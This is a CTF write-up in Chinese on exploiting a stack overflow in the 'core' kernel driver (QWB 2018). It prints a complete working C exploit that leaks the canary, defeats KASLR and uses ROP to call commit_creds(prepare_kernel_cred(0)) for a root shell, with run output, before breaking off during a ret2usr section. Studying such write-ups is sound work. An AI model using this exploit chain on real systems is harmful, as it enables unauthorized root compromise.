<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">core_copy_func</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v1[<span class="number">64</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;16core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">    printk(<span class="string">&quot;16Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, &amp;name, (<span class="keyword">unsigned</span> __int16)a1);   <span class="comment">// 漏洞点:因数组溢出导致的栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是我的第一个内核题，我全程都是按照 wiki 上的提示做的，所以我会尽可能的复述解题的过程和思路，有些必要的知识也会进行补充</p>
<p>当我们打开这个 kernel 时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ whoami</span><br><span class="line">chal</span><br></pre></td></tr></table></figure>
<p>我们是普通用户权限，需要提权拿“flag”，这里先介绍一下权限和提权：</p>
<ul>
<li>内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限</li>
<li>内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源，这里从两种角度来考虑如何提权<ul>
<li>改变自身（Change Self）：通过改变自身进程的权限，使其具有 root 权限<ul>
<li>直接修改 cred 结构体的内容（需要先定位 cred，然后将其修改）</li>
<li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li>
</ul>
</li>
<li>改变别人（Change Others）：通过影响高权限进程的执行，使其完成我们想要的功能<ul>
<li>改数据</li>
<li>改代码</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>具体的过程就不展开了</p>
<ul>
<li>在本题目的环境中，因为程序有栈溢出漏洞可以控制程序执行流，所以可以通过 ROP 来调用 commit_creds(prepare_kernel_cred(0)) 进行提取</li>
<li>该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred</li>
<li>另外，该方式属于“改变自身”中的“修改 task_struct 结构体”</li>
</ul>
<p>为了调用 prepare_kernel_cred 首先需要实现 ROP：</p>
<ul>
<li>通过 ioctl 设置 off，然后通过 core_read() leak 出 canary</li>
<li>通过 core_write() 向 name 写，构造 ropchain</li>
<li>通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop</li>
<li>通过 rop 执行 <code>commit_creds(prepare_kernel_cred(0))</code></li>
<li>返回用户态，通过 system(“/bin/sh”) 等起 shell</li>
</ul>
<p>这又有一个问题，如何在 shell 中使用这些驱动函数呢？在C语言中有专门的接口：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(fd, function_num, var);</span><br></pre></td></tr></table></figure>
<p>使用这个函数的前提是知道 function_num（可以直接在 core_ioctl 的 Switch-Case 中找到它）</p>
<p>接下来介绍利用GDB调试的方法：</p>
<ul>
<li>使用 <code>gdb ./vmlinux</code> 可以进行调试</li>
<li>虽然加载了 kernel 的符号表，但没有加载驱动 <code>core.ko</code> 的符号表，可以通过 <code>add-symbol-file core.ko textaddr</code> 加载 </li>
<li>.text 段的地址可以通过 <code>/sys/modules/core/section/.text</code> 来查看，查看需要 root 权限，因此为了方便调试，我们再改一下 <code>init</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># setsid /bin/cttyhack setuidgid 1000 /bin/sh</span></span><br><span class="line">setsid /bin/cttyhack setuidgid <span class="number">0</span> /bin/sh</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffc0257000</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br><span class="line">/ <span class="meta"># cat /sys/module/core/sections/.text </span></span><br><span class="line"><span class="number">0xffffffffc0257000</span></span><br></pre></td></tr></table></figure>
<p>接下来进行调试：</p>
<ul>
<li>先使用 start.sh 打开 kernel</li>
<li>然后打开 GDB</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  core gdb ./vmlinux   </span><br><span class="line">pwndbg: loaded <span class="number">198</span> commands. Type pwndbg [filter] <span class="keyword">for</span> a <span class="built_in">list</span>.</span><br><span class="line">pwndbg: created $rebase, $<span class="function">ida gdb <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Reading symbols from ./vmlinux...</span></span><br><span class="line"><span class="function"><span class="params">(No debugging symbols found in ./vmlinux)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用 add-symbol-file 加载符号，然后就可以利用符号进行断点了</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file core.ko <span class="number">0xffffffffc0257000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;core.ko&quot;</span> at</span><br><span class="line">	.text_addr = <span class="number">0xffffffffc0257000</span></span><br><span class="line">Reading symbols from core.ko...</span><br><span class="line">(No debugging symbols found in core.ko)</span><br><span class="line">pwndbg&gt; b core_read  </span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0xffffffffc0257063</span></span><br></pre></td></tr></table></figure>
<ul>
<li>尝试用 GDB 连接 kernel</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote localhost:<span class="number">1234</span></span><br><span class="line">Remote debugging <span class="keyword">using</span> localhost:<span class="number">1234</span></span><br><span class="line"><span class="number">0xffffffff9586e7d2</span> in ?? ()</span><br></pre></td></tr></table></figure>
<p>最后就来学习学习官方的exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;-- 直接ROP --&gt; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span> <span class="comment">/* 后门函数 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>; <span class="comment">/* 后续说明基地址的计算 */</span></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span> <span class="comment">/* 收集必要信息 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* 根据前面的分析,这里读取/tmp/kallsyms相当于读取/proc/kallsyms(内核符号表) */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred) <span class="comment">/* 如果都已经读入过了,直接返回 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;	</span><br><span class="line">            <span class="comment">/* 读取commit_creds的地址(更新当前进程的cred),计算vmlinux_base */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>; <span class="comment">/* 后续说明该偏移的计算 */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 读取prepare_kernel_cred的地址(构造一个新的cred),计算vmlinux_base */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>; <span class="comment">/* 后续说明该偏移的计算 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span> <span class="comment">/* 保存当前寄存器的状态 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> idx)</span> <span class="comment">/* 设置off */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span> <span class="comment">/* core_read的外包装 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">long</span> <span class="keyword">long</span> size)</span> <span class="comment">/* core_copy_func的外包装 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols(); <span class="comment">/* 获取相关信息 */</span></span><br><span class="line">    <span class="keyword">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>); <span class="comment">/* 设置全局变量off为&#x27;0x40&#x27;(为了泄露carnay) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf); <span class="comment">/* 从from[off](内核空间)拷贝64个字节到buf(用户空间) */</span></span><br><span class="line">    <span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>]; <span class="comment">/* 因为偏移off是0x40,所以直接泄露了canary */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">/* 初始化ROP链 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">/* 构造ROP链 */</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary; </span><br><span class="line">        <span class="comment">// rop[0-7]:共64字节(8*8),用于填充内核局部变量</span></span><br><span class="line">        <span class="comment">// rop[8]:canary应该在的位置</span></span><br><span class="line">        <span class="comment">// rop[9]:rbp的位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    <span class="comment">/* swapgs:交换GS基址寄存器(准备回到用户态) */</span></span><br><span class="line">    <span class="comment">/* popfq:弹出堆栈到EFLAGS寄存器 */</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line">    <span class="comment">/* iretq:返回到用户空间(在执行iretq之前,先执行swapgs指令) */</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip(后门函数)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>); <span class="comment">/* 最后还是会调用core_write(可能要看源码) */</span></span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>)); <span class="comment">/* 全局变量name中拷贝数据到内核局部变量中 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先介绍几个概念：</p>
<ul>
<li>raw_vmlinux_base：kaslr 加工前的内核加载基址</li>
<li>vmlinux_base：kaslr 加工后的内核加载基址</li>
</ul>
<p>kaslr，类似ASLR，内核基址地址加载随机化</p>
<ul>
<li>通过泄露内核地址，通过偏移计算出内核基址（如果没有开PIE，就可以直接获取 raw_vmlinux_base）</li>
<li>再计算 kaslr 对内核基址的偏移（offset = vmlinux_base - raw_vmlinux_base）</li>
<li>用 offset 修正其他函数的地址</li>
</ul>
<p>官方exp选择从“内核符号表”泄露以下两个函数：</p>
<ul>
<li>prepare_kernel_cred：构造一个新的 cred </li>
<li>commit_creds：更新当前进程的 cred</li>
<li>commit_creds(prepare_kernel_cred(0))：构造一个 cred(0)，并把它更新为当前进程的 cred</li>
</ul>
<p>在主函数中，程序打开了 proc 目录中的某个文件（这个 proc 和 PROC 虚拟文件系统有关），然后调用 ioctl 来执行驱动函数，利用其本身的漏洞泄露 canary，触发 ROP链（就是想方设法构造出“commit_creds(prepare_kernel_cred(0))”，并返回用户空间）</p>
<p>最后看看这几个偏移是怎么计算出来的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>vmlinux = ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/\xe5\xbc\xba\xe7\xbd\x91\xe6\x9d\xaf2018/give_to_player/vmlinux&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    Version:  <span class="number">4.15</span><span class="number">.8</span></span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0xffffffff81000000</span>)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - <span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="string">&#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(vmlinux.sym[<span class="string">&#x27;prepare_kernel_cred&#x27;</span>] - <span class="number">0xffffffff81000000</span>)</span><br><span class="line"><span class="string">&#x27;0x9cce0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[    <span class="number">0.022212</span>] Spectre V2 : Spectre mitigation: LFENCE <span class="keyword">not</span> serializing, switchie</span><br><span class="line">udhcpc: started, v1<span class="number">.26</span><span class="number">.2</span></span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending discover</span><br><span class="line">udhcpc: sending select <span class="keyword">for</span> <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span></span><br><span class="line">udhcpc: lease of <span class="number">10.0</span><span class="number">.2</span><span class="number">.15</span> obtained, lease time <span class="number">86400</span></span><br><span class="line">/ $ whoami</span><br><span class="line">chal</span><br><span class="line">/ $ /tmp/<span class="built_in">exp</span></span><br><span class="line">[*]status has been saved.</span><br><span class="line">commit_creds addr: <span class="number">0xffffffff8b09c8e0</span></span><br><span class="line">vmlinux_base addr: <span class="number">0xffffffff8b000000</span></span><br><span class="line">prepare_kernel_cred addr: <span class="number">0xffffffff8b09cce0</span></span><br><span class="line">[*]<span class="built_in">set</span> off to <span class="number">64</span></span><br><span class="line">[*]read to buf.</span><br><span class="line">[+]canary: <span class="number">0x12ce77bc03269b00</span></span><br><span class="line">[*]copy from user with size: <span class="number">-65280</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>除了 prepare_kernel_cred，还有其他方式来提权，这里介绍一下 ret2usr：</p>
<ul>
<li>ret2usr 攻击利用了用户空间的进程不能访问内核空间，但内核空间能访问用户空间这个特性来定向内核代码或数据流指向用户控件，以 <code>ring 0</code> 特权执行用户空间代码完成提权等操作</li>
</ul>
<p>以本题为例，exp 分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 